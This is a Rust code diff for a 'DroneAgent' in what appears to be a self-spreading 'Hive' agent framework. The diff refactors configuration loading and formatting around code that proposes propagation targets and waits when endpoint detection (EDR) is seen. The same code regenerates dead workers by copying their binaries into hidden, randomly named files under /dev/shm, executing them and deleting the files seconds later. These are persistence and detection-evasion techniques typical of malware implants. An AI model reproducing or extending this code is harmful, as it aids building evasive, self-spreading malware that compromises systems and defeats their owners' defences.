@@ -24,12 +24,18 @@ impl DroneAgent {
     async fn new() -> Self {
         let identity = AgentIdentity::new();
         let comms = HiveChamber::connect(&identity, Role::Drone).await.expect("Hive arena");
-        info!("Hive Drone active | ID: {}", identity.id());
+        let cfg = hive_base::config::HiveConfig::load();
+
+        info!("Hive Drone active | ID: {} | decision_interval: {}s", identity.id(), cfg.agents.shaper_decision_interval_secs);
+
         Self {
-            comms, identity, consensus: ConsensusEngine::new(0.66), dead_agents: vec![],
+            comms, identity,
+            consensus: ConsensusEngine::new(0.66),
+            dead_agents: vec![],
             last_regeneration: Instant::now() - Duration::from_secs(120),
             regeneration_cooldown: Duration::from_secs(60),
-            heartbeat_interval: Duration::from_secs(10), decision_interval: Duration::from_secs(5),
+            heartbeat_interval: Duration::from_secs(cfg.heartbeat.interval_secs),
+            decision_interval: Duration::from_secs(cfg.agents.shaper_decision_interval_secs),
         }
     }
 
@@ -70,24 +76,20 @@ impl DroneAgent {
             return;
         }
         match self.select_action(beliefs) {
-            ShaperAction::PropagateTo(t) => { info!("Drone proposal: prop_to_{}", t);
+            ShaperAction::PropagateTo(t) => {
+                info!("Drone proposal: prop_to_{}", t);
                 let (msg, _) = Message::proposal(self.identity.id(), Role::Drone, format!("prop_to_{}", t), t.clone());
                 self.publish(msg).await;
             }
-            ShaperAction::Wait => info!("Drone: waiting"),
+            ShaperAction::Wait => info!("Drone: waiting (EDR detected)"),
         }
     }
 
     async fn check_regenerate(&mut self) {
-        // Cooldown: don't regenerate more than once per 60s
-        if self.last_regeneration.elapsed() < self.regeneration_cooldown {
-            return;
-        }
-
+        if self.last_regeneration.elapsed() < self.regeneration_cooldown { return; }
         self.comms.send_heartbeat().await;
         let active = self.comms.get_active_agents(30).await;
         let workers = active.iter().filter(|(_, r, _)| matches!(r, Role::Worker)).count();
-
         if workers < 1 {
             warn!("Drone: no Workers alive, regenerating...");
             self.last_regeneration = Instant::now();
@@ -99,30 +101,19 @@ impl DroneAgent {
         let name = match role { Role::Worker => "worker", Role::Weaver => "weaver", _ => return };
         let dir = env::current_exe().ok().and_then(|p| p.parent().map(|p| p.to_path_buf())).unwrap_or_else(|| ".".into());
         let arena = env::var("__HIVE_ARENA").unwrap_or_default();
-
-        // Try to find the binary near us
         let mut found = None;
         for candidate in &[dir.join(name), dir.join(&format!("target/debug/{}", name))] {
             if candidate.exists() { found = Some(candidate.clone()); break; }
         }
-        let path = match found {
-            Some(p) => p,
-            None => { warn!("Drone: cannot find {} binary", name); return; }
-        };
-
+        let path = match found { Some(p) => p, None => { warn!("Drone: cannot find {} binary", name); return; } };
         let data = match fs::read(&path) { Ok(d) => d, Err(_) => { warn!("Drone: cannot read {}", name); return; } };
-
-        // FIXED: write to /dev/shm (tmpfs ramdisk) instead of memfd_create
-        // memfd's /proc/self/fd/N can't resolve dynamic linker for complex binaries
         let shm_path = format!("/dev/shm/.hive_{}_{}", name, uuid::Uuid::new_v4().to_string().chars().take(8).collect::<String>());
         if fs::write(&shm_path, &data).is_err() { warn!("Drone: write failed"); return; }
         let _ = fs::set_permissions(&shm_path, std::fs::Permissions::from_mode(0o700));
-
         match Command::new(&shm_path).env("__HIVE_ARENA", &arena).spawn() {
             Ok(child) => {
                 let pid = child.id();
                 info!("Drone: regenerated {} (PID: {}, path: {})", name, pid, shm_path);
-                // Schedule self-cleanup
                 tokio::spawn(async move {
                     tokio::time::sleep(Duration::from_secs(5)).await;
                     let _ = fs::remove_file(&shm_path);
